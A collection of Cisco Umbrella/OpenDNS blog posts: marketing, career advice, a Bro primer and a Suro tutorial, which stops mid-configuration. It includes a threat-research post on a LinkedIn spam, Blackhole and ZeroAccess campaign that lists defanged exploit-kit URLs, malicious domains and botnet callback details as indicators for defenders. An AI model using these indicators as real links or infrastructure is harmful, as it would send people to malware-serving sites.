{"website": "Cisco-Umbrella", "title": "Healthcare industry embraces Cisco Umbrella", "author": ["Brad Antoniewicz"], "link": "https://umbrella.cisco.com/blog/healthcare-industry-embraces-cisco-umbrella", "abstract": "Why are Healthcare organizations across the country using Cisco Umbrella? Healthcare IT professionals need to overcome a mounting list of security challenges: unmanaged consumer endpoints, ever-changing regulatory landscape, uptick in smart medical devices and an increased use of Wi-Fi networks in hospitals and healthcare facilities. Cloud-delivered security provides faster deployment with an open, automated way to reduce risk, simplify management and control costs. Healthcare industry expenditures on cloud computing will experience a compound annual growth rate of more than 20% by 2020. 1 The industry has quickly transitioned from being hesitant about the cloud to embracing the technology for its overwhelming benefits. George Washington University , a world-renowned research university, turned to Umbrella to protect its most important asset: the global reputation as a research leader. “We chose Cisco Umbrella because it offered a really high level of protection for our various different user bases, with a really low level of interaction required to implement the solution, so we could start blocking attacks and begin saving IR analyst time immediately,” said Mike Glyer, Director, Enterprise Security & Architecture. Customers love Umbrella because it is a cloud-delivered platform that protects users both on and off the network. It stops threats over all ports and protocols for the most comprehensive coverage. Plus, Umbrella’s powerful, effective security does not require the typical operational complexity. By performing everything in the cloud, there is no hardware to install, and no software to manually update. The service is a scalable solution for large healthcare organizations with multiple locations, like The University of Kansas Hospital , r anked among the nation’s best hospitals every year since 2007 by U.S. News & World Report. “Like every hospital, we prioritize the protection of sensitive patient data against malware and other threats. We have to safeguard all network connected medical devices, as a compromise could literally result in a life-or-death situation,” says hospital Infrastructure Security Manager Henry Duong. “Unlike non-academic hospitals, however, our entwinement with medical school and research facility networks means we must also protect a lot sensitive research data and intellectual Property.” Like many healthcare providers, The University of Kansas Hospital would spend a lot time combing through gigabytes of logs trying to trace infections, point of origin and identify which machines were calling out.  The team turned to Cisco Umbrella for help. “First we just pointed our external DNS requests to Cisco Umbrella’s global network, which netted enough information to prompt an instant ‘Wow, we have to have this!’ response,” Duong says. “When our Umbrella trial began, we saw an immediate return, which I was able to document using Umbrella reporting and share with executive stakeholders. Those numbers, which ultimately led to executive buy-in, spoke volumes about the instant effect Umbrella had on our network.” This overwhelming success led the team to later purchase Umbrella Investigate . “We suddenly went from struggling to track attacks to being able to correlate users with events and trace every click of their online travels. Then, Cisco Umbrella Investigate gave us the power to understand each threat’s entire story from start to finish,” Duong says. “We’re able to dig deep into the analysis to see what users are doing, where they’re going, and pinpoint any contributing behaviors so we can mitigate most efficiently.” With impacts like these, isn’t it time you start a free trial today and see what impact Cisco Umbrella can do for on your organization? Like the University of Kansas you could achieve: Decreased threats by an estimated 99 percent Shortened investigation time by 75 percent Increased visibility and automation while reducing exposure to ransomware Watch customer video testimonials for George Washington University and University of Kansas for more information. [1] “Healthcare Cloud Computing Market Worth $9.48 Billion by 2020” Markets and Markets, June 2015", "date": "2017-04-13"},
{"website": "Cisco-Umbrella", "title": "What It Takes to Master Security (Hint: It's Not Certs)", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/17004-2", "abstract": "Currently in security jobs are plentiful. LinkedIn connection invites and recruiter calls are as normal as a daily Agile meeting. But those with career foresight know, it’s not enough to be complacent. To become an expert at the top of the field, progression is essential. Understanding, Not Illusions of Competence In his interviews with candidates, OpenDNS Security Researcher Kevin Bottomley proposes a simple test that will quickly uncover how much a candidate knows. “I ask them to draw me a picture of a DNS request,” he said. “That’s it. Simple.” It sounds simple, but there is a lot to learn from someone’s impromptu illustration of how DNS works. Does this person know the difference between authoritative and recursive DNS? Where does the ISP fit in the traversing route of DNS traffic? As a result, Bottomley gets a good idea of the person’s understanding of the concepts involved, and also how the candidate thinks logically and can apply that understanding. Security is no place for the illusions of competence . Personal challenges are a huge component to advancing knowledge in any field. The skillsets of security professionals, sys admins, and software programmers are very closely tied, and as such so are the career progression of all three. And for all three fields, being adaptable and flexible plays a huge role. Sys Admin Shahab Sheikhzadeh reiterated this in an e-mail interview, “[Security professionals] have to be crafty & be able to adapt to the situations that arise. Being able to know how to overcome the failings of a script & how to write code to perform an operation, or use different system calls to accomplish the same task, is paramount.” In terms of skills, there are no shortage of resources to mine for knowledge: hundreds of technical how-to books, classes and MOOCs, sites like IronGeek.com . But to become an elite security pro, it takes a lot more than skills. To Digital Forensic Analyst and SANS Institute Fellow Hal Pomeranz, it’s also about putting yourself into the community. Apply Knowledge, Then Share It “The people that I am more likely to listen to and trust are the ones who are doing work, doing research, and actually talking and writing about it effectively,” Pomeranz said in an interview. “Putting yourself out there means you have enough confidence in your abilities to withstand peer review. And it also demonstrates good communication skills, which are important in any field, but also one of the distinguishing factors for an expert.” Pomeranz alluded to a progression that security professionals — and really any programmer or developer — goes through to reach expert level. The major difference in the progression is knowing how, versus knowing why. “Practicioners can perform skills that they’ve been trained to do. Experts can integrate knowledge, possibly from multiple disciplines, to solve novel and complex problems.” And then of course, there’s the continued learning that is required. Because in security, like many other related fields in tech, everything changes. Constantly. Pomeranz quoted a friend of his, Celeste Stokely, who told him “Learn one big new thing every year.” It’s not bad advice, because staying sharp and ahead of colleagues means working and learning while they are sleeping…or doing that extra conference talk. Don’t Focus on the Right Tools According to Spotify Developer Mattias Johansson — who also runs the programming YouTube channel “ funfunfunction ” — it’s also important to not get hung up on which system or toolset will give you an edge and career longevity. In a video posted September 2015, Johansson covers a topical question he gets constantly from early level programmers. What is the best toolset or programming language to learn? Johansson decoded this question and reinterpreted it to find what commenters were really asking: What should I learn to keep myself employed? “Learning a popular tool or the next big thing will get you a job,” he says in the video’s summary. “But in order to be relevant, you should learn programming, not tools. If you practice programming well, and not just tools or languages, you will be a very sought after programmer.” Regardless of the career field in question, Bottomley, Pomeranz, and Johansson all allude to one unifying theme to becoming a respected expert: a fluid mastery. A tip-of-the-tongue, verbose understanding of the field, it’s tools and all that’s required to solve problems, with the added tenacity to do it. It’s a mindset more than just a skillset.", "date": "2016-02-11"},
{"website": "Cisco-Umbrella", "title": "You Keep Using That Word. I Do Not Think It Means What You Think It Means.", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/keep-using-word-think-means-think-means", "abstract": "Buzzwords are the worst, and unfortunately the security industry is rife with jargon—terms that either don’t mean anything in the first place or try ineffectively to dress up un-sexy verbiage for marketing purposes. You’ll definitely see some familiar argot below; many practitioners and all vendors are guilty of using these phrases—including us! In this post, we round up the worst words around and examine how they’re being used in the security space. Now, you can stop shouting “the cloud! the cloud!” at your screen – we’ll get to it. But first, the rest of the list: Defense-in-Depth (a.k.a. expense-in-depth): Buyer, beware! This concept refers to the multiple layers of security protecting your data. Unfortunately, this term has also become the battlecry of “me too” vendors – salesmen trying to con buyers into wasting money on solutions they don’t really need. Smart security spending, strategically aligned to what your greatest risks are, will trump a mess of the latest and greatest any day. APT (Advanced Persistent Threat): More like advanced persistent term , amirite? First, an incredibly brief definition: APTs are a specific type of targeted attack. They are conceived and executed by professionals using highly evolved methods, and their goal is to live in your network for long periods of time, siphoning data from your organization for malicious purposes. Real APTs are serious threats and should be recognized as such. That being said, APT is a handy acronym that looks great when written threateningly at the top of a Web page or one-pager. This once-serious term has been ground through the marketing mill so thoroughly that it has very little meaning anymore – vendors claim that their solutions can protect against APTs, but guess what ? THEY DON’T—they’re just slapping the APT label on any attack that threatens your network, advanced, persistent, targeted, or not. Big Data: First things first—if you are storing or analyzing “big data” in an SQL database or SIEM, it is not big data. In a world where everyone claims to have vast amounts of information at their fingertips, the term is subjective and size is relative. More importantly, when discussing the concept of Big Data, most people get hung up on volume, and often neglect the fact that extracting relevant and compelling intelligence (in a timely fashion) from that data is the real prize. For more information on Big Data, check out this blog from OpenDNS Product Manager Trey Kelly. Unknown Threat: “Reports that say there’s—that something hasn’t happened are always interesting to me, because as we know, there are known knowns; there are things that we know that we know. We also know there are known unknowns; that is to say we know there are some things we do not know. But there are also unknown unknowns, the ones we don’t know we don’t know.” – Donald Rumsfeld ROI: A phrase seemingly invented to placate management types. What could be better than explaining how much money and/or time you’re about to save the company? Not much. However, this term becomes relatively meaningless to actual security practitioners before the ink dries on the contract. Best of breed: User-friendly: A great characteristic to list on your product page, but irrelevant for practiced professionals. “User-friendly” smacks of the technically incompetent. Next-Generation: Vendors are constantly trying to out-do their competition––so it makes sense that companies don’t just want to be the best TODAY, they want to be the best tomorrow, too. But who decides when one generation ends, and another begins? Does a survey go out? Is there a countdown clock? And in 2015, are we going to start seeing marketing promos for the Next-Next-Generation Firewalls? At the end of the day, this phrase is so overused it has absolutely no meaning. The Cloud: Typing “What is the cloud?” into Google yields about 265,000,000 results, yet somehow, no one seems to know what the cloud is. It’s a term as nebulous and ephemeral as its namesake, and thus has been exploited to death by marketers looking to capitalize on the confusion of buyers. Here’s the thing: done right, the cloud is awesome . It can give individuals and organizations alike access to new tools that promote efficiency, collaboration, productivity, and security at scale. Unfortunately, these tangible benefits of cloud computing have remained a mystery to most people, causing them to place the cloud on a puffy pedestal and creating headaches for their earth-bound IT admins ( sometimes with hilarious results ).", "date": "2014-06-20"},
{"website": "Cisco-Umbrella", "title": "OpenDNS Enforces Threat Intelligence at the Speed of Automatic", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/opendns-custom-api-operationalizes-threat-intelligence", "abstract": "As illustrated recently, APIs are already a crucial factor in stitching security intelligence together from the different systems of a security stack. Analysts need to know where to apply enforcement, and fast. Each minute matters when mitigating an attack. The problem is, because of the sheer volume of incoming alerts, combined with the amount of false positives, analysts are experiencing a frustrating amount of information overload . The intelligence security professionals have at their disposal is what fuels the action to protect, prevent, and remediate attacks. But according to some industry analysts, intelligence enforcement is where the security industry is failing. John Oltsik, Senior Principal Analyst at ESG, wrote about this topic in a recent Network World article . According to Oltsik, the immaturity of threat intelligence causes security professionals to share info using methods that are fairly manual and antiquated. “Many [security] firms struggle with threat intelligence processing, correlation, and analytics, often depending upon homegrown tools in this area,” Oltsik said. “Security professionals complain that it is still quite difficult to operationalize threat intelligence programs so they can prioritize actions and measure success.” Enforcement APIs are becoming a crucial enabler to making this possible. According to CTO Dan Hubbard, this lack of enforcement is why OpenDNS launched a new enforcement API. “Security efficacy has started going down,” Hubbard said in an interview. “The challenge is how do you take intelligence to an actionable enforcement? Without that, you have to get your duct tape, glue, stapler, and fit it into all your other systems.” OpenDNS is expecting its new API to act as the missing enforcement arm of security intelligence. Since security teams are spending time aggregating their intelligence either through their own efforts or by using a product like a threat intelligence platform (TIP), those teams need a way of enforcing whatever intelligence they find actionable. According to OpenDNS Senior Product Manager Scott Cressman, security teams are currently relying on a very manual hodgepodge of systems to do this. “Companies build up a team of security analysts and end up being product developers for the frankensystem of tools they’re forced to create by munging together a host of intelligence systems,” Cressman said. “What this API provides is a way to enforce all the different types of intelligence and cover your entire network in seconds.” How It Works The cloud security provider has already released other APIs that provide information about events or domains and can allow changes to policies. The new enforcement API is also RESTful, and can ingest events formatted in the existing API documentation. Using these events, security analysts can create a useful telemetry feedback loop, Cressman added. Pictured is a diagram of what this feedback loop would look like. Rather than being yet another API that provides a source of intelligence, this new release is the plug that takes intelligence on one end, and pushes out enforcement on the other end. Depending on how it’s configured and what it finds, the API can then feed intelligence platforms and SIEMs logs and contextual information about malicious domains. According to the API’s documentation, an event can be added to the API following the proper format either through a custom script, a direct call, or through a partner integration like ThreatConnect or ThreatQuotient. If it successfully finds a domain, it can be fed to Security Graph to verify whether or not it is malicious. From there, it will either block that domain or allow it based on the security preferences already configured in the dashboard. This information can then be stored in Amazon S3 logs and fed back to a company’s SIEM for further analysis. How to Get It Announced today, OpenDNS customers on the Investigate or Platform packages can make use of the new API functionality right away. To get a plan that includes the API capability, contact OpenDNS sales .", "date": "2015-05-13"},
{"website": "Cisco-Umbrella", "title": "A look at a \"LinkedIn Spam mail, Blackhole, ZeroAccess\" campaign", "author": ["Dhia Mahjoub"], "link": "https://umbrella.cisco.com/blog/a-look-at-a-linkedin-spam-mail-blackhole-zeroaccess-campaign", "abstract": "LinkedIn spam mail campaigns have been around for at least 3 years: you receive a bogus invitation to connect on LinkedIn leading to a compromised page which lands on an Exploit Kit-laden server that eventually drops malware on your machine. The past spam campaigns combined Blackhole Exploit with Cridex or Zeus malware as it was reported in [1] and well discussed in [2] . Last Monday, we witnessed the emergence of a new LinkedIn spam mail campaign as we see below (Thanks to @peterkruse for reporting it) Exploitation chain In this particular case, if you click the “Accept” button, you are redirected to hxxp://champagnefuif.klammehand.be/modules/wp-enter.php?xV72H17G11U7AT2AA, a compromised WordPress page and from there you land on hxxp://languagespreferably.biz/closest/i9jfuhioejskveohnuojfir.php, a Blackhole Exploit landing page. The exploit inspects your machine’s plugins for any vulnerabilities and, if successful, places a file named calc.exe on your machine, which is a ZeroAccess dropper. You just became part of the ZeroAccess botnet! The binary matches this VirusTotal signature . In the figure below, we can see the spike in traffic on Monday Sep 2nd, when the spam campaign started. Looking at the behavioral section of the VirusTotal report of the dropped ZeroAccess sample, we see these DNS requests: j.maxmind.com (108.168.255.244) www.google.com (173.194.45.83) The bot looks up google.com to test for internet connectivity, and resolves maxmind.com so that it can call the geoip service with this HTTP request: URL: http://j.maxmind.com/app/geoip.js TYPE: GET USER AGENT: None The GeoIP callbacks to maxmind are a typical Sirefef/ZeroAccess trademark, because the malware needs to find out what country it is located in. ZeroAccess is known to be used to download other malware on an infected machine; once the malware detects where it is, it knows where to connect  next so it can download further payload (mostly Medfos malware). In this campaign, ZeroAccess is dropped by a Blackhole version dubbed ”closest” which was first well described by MalwareMustDie in [3] . Similar spam campaigns such as those targeting Facebook and redirecting to Blackhole were observed to drop Trojan Zbot/Pony (Credential Stealer), MedFos (downloader) and Zero Access, as reported in [4] . ZeroAccess callback IPs Once installed, ZeroAccess tries to connect to a peer-to-peer network to download plugin files to enrich the payload functionality. In the behavioral section of the VirusTotal report, we can see a list of supernode callback IPs the ZeroAccess sample tries to contact on UDP port 16464. Running the sample locally in a VM also produces a larger list of supernode callback IPs. Supernodes are the internet-facing nodes of the botnet that distribute files and IP lists to other nodes in the botnet. On the other hand, normal botnet nodes might be sitting behind NAT and can only communicate through the supernodes with the outside CnCs. We checked the larger list of 89 callback IPs, and we found out that a few of these IPs have hosted 17 Kelihos Fast flux domains (or subdomains) in the past, that we list here: abeeu.bobpawa.com, aqa.renuncam.nl, cx3r5.nigucgu.com, cych.zymofevy.me, dahadkyz.ru, davujuz.com, fcegrrtc.mapuhxaf.ru, flowsre.com, hsej0rr7.insomtab.nl, huznejex.ru, nenkudyf.ru, ogfonis.org, powerwik.ru, teeply.info, widerat.com, xexumyb.com, ximirsex.ru. These domains have already been blocked a while ago, and reported for suspension or sinkholing. The overlap between the IP pools of the ZeroAccess and Kelihos botnets is an indication that botnets are a commodity shared among criminal campaigns to speed up the spread of infections and information stealing. More good resources on ZeroAccees can be found in [5] . Discovering related domains with Security Graph Starting from the landing domain languagespreferably.biz, and using a domain reputation algorithm applied on the SGraph DNS database, we uncover a large set of 200+ related new suspicious domains serving Blackhole Exploit kit, other Exploit kits, and other malicious campaigns (such as trojan CnC). We also cross check domain registration dates, and check DNS traffic spikes to these domains. This constitutes a fast early detection system of Exploit-weaponized domains (or soon to be weaponized ones, or related new suspicious domains destined for other purposes). A lot of these EK landing domains are rather unstable on purpose. We observed that shortly after they are registered, these domains start resolving to an IP hosting an EK server, then they trigger a surge in DNS traffic for a few hours followed by a complete silence. Oftentimes, the domain stops serving the exploits or it just stops resolving. This is a clear indication that these domains are used in “hit and run” spam mail campaigns. A lot of these domains are also quickly sinkholed or suspended by registrars, hence the tendency of criminals to register these “throw-away” domains, swiftly use them, and move to a new set. We also observed examples of such domains that were registered a couple months ago and after their initial spike in activity have since gone silent. This could possibly be another trick to stay under the “radar,” evade suspension or sinkholing, and potentially come back later to be used in future malicious campaigns. In the figure below, we can see the surge in traffic for this Blackhole landing domain spotted very recently. Furthermore, we can consult url databases such as VirusTotal, or urlquery to identify known active urls on these domains. With that, one can identify EK landing pages and eventually milk them for malware payloads for further analysis. These EK servers were seen to block certain IP ranges belonging to security companies or Tor proxies, therefore, other measures should be taken to circumvent these protective tricks and still be able to retrieve live payloads. This can be discussed in a future blog. Below, we show a sample of some confirmed Exploit Kit or suspicious domains: associatesbreath.biz yellowgreenjackofalltrades.biz harshnesspresentations.biz languagespreferably.biz topmanageaccessible.biz powerred.biz sharednonstop.biz supermodelstomp.biz wmpslewd.biz broadcastcontentrich.org Acknowledgments: Special thanks to all the great friends from MalwareMustDie (@RazorEQX and @VriesHd and more) for their valuable contribution to the discussion on ZeroAccess and discovery of the initial Blackhole landing domains.", "date": "2013-09-10"},
{"website": "Cisco-Umbrella", "title": "Security Challenges Mount for Higher Education", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/security-challenges-mount-for-higher-education", "abstract": "Universities and other higher education institutions have long been heralded as strongholds of advanced and independent thought. They are the crucibles in which our most brilliant minds are forged, serving as exchange points to discuss and collaborate on the new theories and inventions that shape our world. However, these great advantages also come with unique security challenges to overcome. The higher education vertical has been often lumped together with the enterprise in security discourse—and to be fair, the two have many similarities, such as the need for multiple enforcement policies, large numbers of end users, and distributed networks, to name a few. However, the differences between the two are enough that universities and colleges need their own security discussion, one that examines the needs and challenges specific to higher education. And this discussion cannot happen soon enough. Since 2005, there have been more than 500 breaches at higher education institutions. In 2014 alone, these breaches accounted for 35% of all reported attacks . To find out more about the unique challenges facing higher education, I sat down with OpenDNS Network Security Engineer Alvin Wong, who has held several IT and security positions at both the University of British Columbia and BCNet . In Wong’s opinion, approaching security at an educational institution like a commercial enterprise may not be a good fit. “Academia requires free and open Internet access without filtering or censorship,” he said. “So to put in traditionally enterprise-focused security controls can be difficult and quite political, in the literal sense of the word.” Academia Demands Open Networks The disparity between being a secure institution, and being free and open is further complicated by the distributed nature of many university networks, which can stretch across cities and even around the globe. Although Wong mentioned several potential issues this system introduced, one of the most common was student and faculty connectivity. A professor in Tokyo must have the same protection as a professor in New York, as they’re accessing the same internal resources and data—not to mention partnerships with other schools and potentially corporations. Another complication is the democratic process institutions use to decide issues like security and access. This dramatically increases the amount of time it takes for adequate security policies to take effect, an unfortunate situation in an industry where even seconds could make a substantial difference during an attack. “Everyone has to have a seat at the table,” Wong said. “It’s not the same as a corporate environment where you can have a strict security policy—a ‘straight block anything, ask questions later’ type of situation.” Ramen Dinners, Library Naps, and BYOD In a recent Forbes blog, Sue Poremba called campuses a “ melting pot of devices, applications, social media groups, and technology fads .” Mobile devices have worked their way firmly into our everyday lives, and you’d be hard-pressed to find any college student without a laptop, smart phone, or tablet handy at all times. This creates a host of issues for busy campus security practitioners, who must secure an ever-increasing number of devices. “Schools have a huge BYOD problem,” Wong said. “There’s no such thing as a perimeter for a university.” Students aren’t the only ones bringing devices to the network either—especially in research universities. “When researchers get funded, they usually bring in their own equipment. The main focus is then getting that equipment hooked up to the network properly, instead of dictating policy,” Wong said. “Unfortunately, security isn’t always top of mind for researchers.” This is especially troubling as research is one of the most targeted elements inside campus networks, after personal data. Rodney Petersen, managing director for the Washington office of EduCAUSE , says institutions have failed to acknowledge the need for better protection. “What we have been slow to recognize is that the information we have on campus –whether it’s the intellectual property of the academy, or more importantly personally identifiable information–requires a similar level of high protection,” he said. Shadow IT Is Rampant in Campus Networks In addition to the challenges presented by BYOD, and also in part because of them, shadow IT is another prevalent issue at universities. Wong indicated that due to the proliferation of cloud services, and a lack of visibility into network activity, administrators are essentially running blind. “What’s to stop Professor X from putting some intellectual property on Dropbox or some other service, or sending an email from a non-university email? There’s all kinds of complexity surrounding where data is stored and people using things beyond the perimeter,” Wong said. With app stores just a click away, and a campus full of insecure BYOD devices, shadow IT presents a juicy opportunity for attackers. “Our endpoints were a point of entry into our infrastructure,” Wong said. “We saw a lot of viruses, a lot of malware getting on machines—just detecting those and having visibility into the network was a challenge.” User education is a way around this problem though, Wong stated. “Making sure everyone is on the same page when it comes to software, for example, what AV to use, and making these tools easily available, is essential,” he said. “Then, you can have staff reinforce the policy, like making sure students have up-to-date software versions installed.” Phishing and Infrastructure Attacks According to Wong, public universities are required to provide contact information online, providing a veritable feast of information for social engineers to use as credentials. With endpoints left vulnerable, spear phishing against a member of the school teaching staff or administration could prove devastatingly effective. In addition to phishing, schools also have to be wary of parasitic infrastructure attacks, Wong said. “Universities are pretty valuable for computing power, and for bandwidth to store traffic or use for DDoS attacks—attackers aren’t just after the intellectual property, but are attempting to gain control of infrastructure they can leverage.” These are a small sampling of the challenges faced by higher education institutions. As attacks grow bolder and technology advances, it becomes more vital than ever to have a scalable, robust security stack in place, as well as a healthy user education program to mitigate infections caused by user error. “A lot of higher ed security is reactive, simply because of the sheer scale and number of projects, and the disparate directions people are going,” Wong said. “It’s definitely harder than enterprise security, if we’re comparing the two.”", "date": "2015-05-06"},
{"website": "Cisco-Umbrella", "title": "Growing Interest in Bro Helps Security Professionals Watch over Their Networks", "author": ["Kara Drapala"], "link": "https://umbrella.cisco.com/blog/growing-interest-in-bro-helps-security-professionals-watch-over-their-networks", "abstract": "Having sufficient insight about events in your network can help first responders prioritize threats and respond correctly , saving time and personnel resources—always in short supply, especially for smaller shops. One of the tools that can help security practitioners gain this insight is Bro, a network monitoring platform. Last week, OpenDNS hosted the inaugural Bro4Pros workshop, an in-depth two-day event featuring advanced user sessions. These sessions were given by the people who know Bro best, including several members of the organization’s development team and researchers from around the country. Although you may not have heard the name previously, the Bro platform has been around for some time—it celebrates its 20th anniversary this year. The platform itself is the product of a small group of intensely dedicated developers and researchers building on the initial design by Vern Paxson , who now leads Bro’s continuous development along with Robin Sommer . “We had never planned to do a workshop like this,” said Seth Hall, a research engineer at the International Computer Science Institute and one of Bro’s core developers. “A few years ago, there weren’t enough people using Bro at a high enough level to do something like this. But everyone who runs Bro is crazy about it—that’s one of the reasons it’s fun to work on, and that’s why the community eventually grew enough for us to put on this workshop.” One of the major reasons for Bro’s success is funding from the National Science Foundation in the form of two research grants. The awards, which were given to further research and projects developing Bro, will help keep the platform’s creators going through 2016. Despite the limited resources, the team has managed to build a powerhouse tool that sees use with security teams in several industries, from corporations to universities to government offices. “There’s no other open source product—or even commercial product—that does what Bro does,” said Hall. “We’ve even seen people rip out commercial products to run Bro.” Sound intriguing? Below, you’ll find a quick primer to get you up to speed on Bro, often considered the best kept secret in security: Everything to Know About Bro (Well, Almost.) Cheekily named after “big brother”, Bro is an open source network monitoring framework that can help a network operator identify malicious or suspicious events in network traffic. “At an extremely high level, Bro can be described as network traffic in, database out,” said Hall. “The data is well organized—not like a log file. It’s easy to parse out the information and work with it.” According to Paxson’s introductory paper, Bro: A System for Detecting Network Intruders in Real-Time , “Bro is divided into an “event engine” that reduces a kernel-filtered network traffic stream into a series of higher-level events, and a “policy script interpreter” that interprets event handlers written in a specialized language used to express a site’s security policy. Event handlers can update state information, synthesize new events, record information to disk, and generate real-time notifications via syslog.” While the basic Bro platform is comprehensive, it is also programmable, allowing network operators to include additional scripts which customizes and extends the capabilities of the program. This flexibility allows Bro to be folded into almost any security stack—and as mentioned earlier,  it’s already used operationally at large organizations around the world. Bro Benefits One of Bro’s biggest value-adds is the amount of data it logs, allowing network operators to identify threats rapidly. “Nothing else gives [security practitioners] structured data on what sites are visited, what emails are sent, and what SSH connections are happening—Bro is a rich data source,” Hall said. The best part? All data processed in Bro is coming from your network—an accessible resource everyone has. “Eventually, the Big Data community will catch on to Bro,” Hall predicted. “It has deep, flexible logging, and puts out so much data you won’t even know what to do with it!” The other benefit of using Bro in your environment is the visibility it provides—an essential element for securing a network. According to Hall, “Visibility is the only defense you can have. It’s the last line of defense because not everything is known—sometimes you have to hunt and find malicious activity. That’s why most people learn Bro, because having visibility is key. As security practitioners, we have to know what’s going on, and then we can respond.” Want to Give Bro a Try? Initially, Bro may seem intimidating, but there are a wealth of resources available to network operators who are just starting out. The official Bro website (Zeek.org) is a great place to start, as is GitHub . As evidenced by this workshop, the wider Bro community is thriving, and offers many different options for connecting to Bro experts all over the world.", "date": "2015-02-24"},
{"website": "Cisco-Umbrella", "title": "Tutorial: Basic Netflix Suro Client/Server Routing to Elasticsearch", "author": ["OpenDNS Engineering"], "link": "https://umbrella.cisco.com/blog/tutorial-basic-netflix-suro-clientserver-routing-to-elasticsearch", "abstract": "Companies are increasing the amount of incoming data they need to process and store, so it can be overwhelming to find a scalable solution that can route this data to multiple sources efficiently. In an attempt to solve this issue, Netflix has released one of their internal tools as open source that helps centralize incoming application data to be sent to different data technologies. Suro is a distributed pipeline that services the moving, aggregating, routing, and storing of data across multiple platforms. Netflix uses Suro for distributing data across their network of databases including numerous AWS EC2 instances and large Hadoop (HDFS) clusters. It is scalable, and the data transferred is highly available utilizing the async/sync communication protocols in the Suro client. The Suro server supports inputs from Thrift and Kafka, and outputs data to its built-in data sinks for the local file system, HDFS, S3, Kafka, and Elasticsearch. In this tutorial, we dive into a basic client/server model of Suro. First, we will create a basic server that simply takes a message sent from the client using Thrift . Upon receiving the message through Thrift, the server then routes it to a local file using the LocalFileSink. Next we add a layer to incorporate sending messages to the ElasticSearchSink. This tutorial is meant to help readers better understand the basic functionalities of Suro and highlight the interesting feature of routing incoming data to multiple sources. Requirements: Unix programming environment Java Runtime Environment (JRE) installed Basic knowledge of UNIX terminal commands git installed A Java IDE (e.g., IntelliJ, Eclipse) A basic Elasticsearch cluster/node setup (download and installation instructions here .) Part 1: Setting Up the Server: We begin with setting up a basic Suro server. Clone the Suro GitHub repository git clone https://github.com/Netflix/suro cd suro Make sure your repository is checked out to branch 0.2.9 git branch If not, checkout branch 0.2.9 git checkout 0.2.9 Compile using Gradle commands: ./gradlew installApp cd suro-server Modify configuration files in the “conf” directory: File: input.json Description: This configuration file specifies the types of inputs Suro server will consume. Currently it only has two options: Thrift and Kafka. A Suro server may have multiple inputs. For this tutorial, we will only look at the Thrift input. [\n     {\n     \"type\": \"thrift\"\n     }\n] File: routingmap.json: Description: This configuration file specifies which routing keys point to which sinks. For the first part of the tutorial, we will leave this empty because we will only be using one sink. If a key is not specified in this file,  the routing key will point to the default sink. {\n} File: sink.json Description: This configuration file specifies the sinks to which the Suro server will route. We will begin by using a LocalFileSink as our default. The outputDir path specifies where the sent messages will be saved. {\n     \"default\": {\n          \"type\": \"local\",\n          \"outputDir\": \"/tmp/suroserver/demo\",\n          \"minPercentFreeDisk\": 10,\n          \"writer\": {\n                  \"type\": \"text\"\n          }\n     }\n} Setting Up the Client: We will now create a separate Suro client. This post demonstrates how to do this on IntelliJ, but other Java IDE’s should be similar. 1. Create a Maven project: Open IntelliJ and create a new project. Select Maven on the sidebar and choose the Java SDK installed on your system. Click Next. Next enter a Groupid and Artifactid. Click Next. Finally, enter a project name and click Finish. 2.  In the generated pom.xml file, add these repositories and dependencies. <repositories>\n     <repository>\n          <id>github.release.repo</id>\n          <url>https://raw.github.com/bulldog2011/bulldog-repo/master/repo/releases/</url>\n     </repository>\n</repositories>\n<dependencies>\n     <dependency>\n          <groupId>com.leansoft</groupId>\n          <artifactId>bigqueue</artifactId>\n          <version>0.7.0</version>\n     </dependency>\n     <dependency>\n          <groupId>com.netflix.suro</groupId>\n          <artifactId>suro-client</artifactId>\n          <version>0.2.9</version>\n     </dependency>\n     <dependency>\n          <groupId>com.google.guava</groupId>\n          <artifactId>guava</artifactId>\n          <version>18.0</version>\n     </dependency>\n</dependencies> 3. Create a class named DemoSuroClient in /demo-suro-client/src/main/java: 4. Add the following to DemoSuroClient class to look like this: import java.util.Properties; import com.netflix.suro.ClientConfig;\nimport com.netflix.suro.client.SuroClient;\nimport com.netflix.suro.message.Message;\npublic class DemoSuroClient {\n     public static void main(String[] args) {\n          final Properties clientProperties = new Properties();\n          clientProperties.setProperty(ClientConfig.LB_TYPE, \"static\");\n          clientProperties.setProperty(ClientConfig.LB_SERVER,\n\"localhost:7101\");\n          SuroClient client = new SuroClient(clientProperties);\n          client.send(new Message(\"routingKey\", \"Test Message\".getBytes()));\n          client.shutdown();\n     }\n} Explanation: This is our basic Suro client. We create a client using the minimum required properties: the load balancer type the IP address and port number of the Suro server (you can find this information outputted on terminal when you run the server) Next we send a message to the Suro server, which includes the routing key and the message payload in bytes. Running/Testing Suro (LocalFileSink): Time to run Suro! Run Suro Server: In terminal, cd to the /suro/suro-server directory Enter: java -cp \"build/install/suro-server/lib/*\" com.netflix.suro.SuroServer -m conf/routingmap.json -s conf/sink.json -i conf/input.json Run Suro Client: NOTE: You might see this exception outputted by the server on the terminal: org.apache.thrift.transport.TTransportException: java.net.SocketException: Invalid argument ... Ignore this message. It is a known issue. Click here for more info. Verify the message was sent to the server: Go to http://localhost:7103/surosinkstat You should see: default:1 msgs, 12 bytes written, 0 have empty routing key. 0 failures of closing files Stop running the client (Note: you may notice that your client doesn’t shut down. This is a known issue.) Stop running server In terminal, hit “Ctrl-C” Verify messages were received by the LocalFileSink cd /tmp/suroserver/demo cat *.done (* = arbitrary file name Suro generates for the file) You should see: Test Message So far in the tutorial, we managed to create a simple Suro client that can send a string message via Thrift to the Suro server. The server then routes the message to the LocalFileSink. We verified this by checking “suroinkstat” using the web browser interface and checking the physical file in the local directory. Take note that the routing key sent with the message is arbitrary since we only have one sink. Therefore all messages sent with any routing key will be routed to the default sink, that is the LocalFileSink. Part 2: Setting Up Suro to Use ElasticSearchSink: We will now simulate the big data problem on a smaller scale. The next part of the tutorial adds the ElasticSearchSink layer to demonstrate how Suro is able to route messages to different data storage sources with its built in sinks. Modify Suro Server configuration files: File: routingmap.json Description: In part 1 this file was empty, but now we need to add a message routing map because we have multiple sinks. We specify that messages with routing key “esKey” will be directed to the sink labeled “esSink.” Any other routing keys will be directed to the default sink. {\n     \"esKey\": {\n        \"where\": [\n               {\n               \"sink\": \"esSink\"\n               }\n               ]\n     }\n} File: sink.json First we will go over the parameters needed for the ElasticSearchSink configurations. Important parameters: The above image is what our ElasticSearchSink configurations will look like. Here is a brief summary of the parameters: 